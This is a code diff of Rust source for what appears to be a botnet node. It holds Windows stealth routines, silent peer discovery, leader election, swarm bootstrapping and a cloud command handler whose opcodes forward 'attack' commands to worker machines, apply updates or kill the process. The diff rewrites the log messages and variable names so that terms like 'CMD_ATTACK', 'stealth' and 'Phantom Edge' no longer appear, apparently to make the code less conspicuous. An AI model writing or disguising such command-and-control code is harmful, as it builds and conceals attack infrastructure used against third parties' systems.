@@ -9,11 +9,10 @@ use modules::bridge::BridgeService;
 use modules::network_watchdog::{NetworkWatchdog, run_fallback_monitor};
 use log::{info, error, warn, debug};
 use std::collections::HashSet;
-use std::sync::{Arc, Mutex};
+use std::sync::Arc;
 use std::time::{Duration, Instant};
 use tokio::time::sleep;
 use tokio::sync::mpsc;
-use tokio::io::AsyncWriteExt;
 use rand::Rng; // Added for worker_id generation
 use modules::local_comm::{LocalTransport, LipcMsgType};
 
@@ -58,15 +57,15 @@ impl Deduplicator {
 #[tokio::main]
 async fn main() {
     env_logger::init();
-    info!("Phantom Edge Started - LAN Clustering Mode");
+    info!("edge started");
 
     #[cfg(target_os = "windows")]
     modules::windows::check_and_apply_stealth();
     
-    let stealth_disc = Arc::new(ZeroNoiseDiscovery::new());
-    let stealth_clone = stealth_disc.clone();
+    let disc = Arc::new(ZeroNoiseDiscovery::new());
+    let dc = disc.clone();
     tokio::spawn(async move {
-        stealth_clone.run_daemon().await;
+        dc.run_daemon().await;
     });
 
     let election = Arc::new(ElectionService::new().await);
@@ -80,7 +79,7 @@ async fn main() {
 }
 
 async fn run_leader_mode(election: Arc<ElectionService>) {
-    info!("[Modes] Entering LEADER Mode. Connecting to Cloud + Listening for Workers.");
+    info!("role: leader");
 
     let watchdog = Arc::new(NetworkWatchdog::new());
     
@@ -99,17 +98,17 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
 
     let swarm_nodes = match bootstrapper.resolve().await {
         Some(nodes) => {
-            info!("[Bootstrap] Resolved {} Swarm Nodes via Parallel Race.", nodes.len());
+            info!("bootstrap: {} nodes", nodes.len());
             nodes
         },
         None => {
-            warn!("[Bootstrap] Resolution Failed. Fallback to Localhost.");
+            warn!("bootstrap: failed");
             vec![("127.0.0.1".to_string(), 1883)]
         }
     };
 
     if swarm_nodes.is_empty() {
-        error!("[Bootstrap] Critical: No nodes available.");
+        error!("bootstrap: no nodes");
         return;
     }
 
@@ -147,32 +146,32 @@ async fn run_leader_mode(election: Arc<ElectionService>) {
     let bridge_tx = msg_tx.clone();
     tokio::spawn(async move {
         while let Some(cmd) = cmd_rx.recv().await {
-            info!("[Leader] Recv Command from Cloud: {} bytes", cmd.len());
+            info!("cmd: {} bytes", cmd.len());
             wd_cmd.mark_alive();
             
             if cmd.is_empty() { continue; }
             
             let opcode = cmd[0];
-            let payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
+            let _payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
             
             match opcode {
                 0x01 => {
-                    info!("[Leader] CMD_ATTACK: Forwarding to workers");
+                    info!("cmd: attack");
                     let _ = bridge_tx.send(cmd.clone()).await;
                 }
                 0x02 => {
-                    info!("[Leader] CMD_UPDATE: Config update received");
+                    info!("cmd: update");
                     let _ = bridge_tx.send(cmd.clone()).await;
                 }
                 0x03 => {
-                    info!("[Leader] CMD_KILL: Shutdown signal");
+                    info!("cmd: kill");
                     std::process::exit(0);
                 }
                 0x04 => {
-                    info!("[Leader] CMD_STATUS: Reporting status");
+                    info!("cmd: status");
                 }
                 _ => {
-                    warn!("[Leader] Unknown opcode: 0x{:02X}", opcode);
+                    warn!("cmd: 0x{:02X}", opcode);
                 }
             }
         }
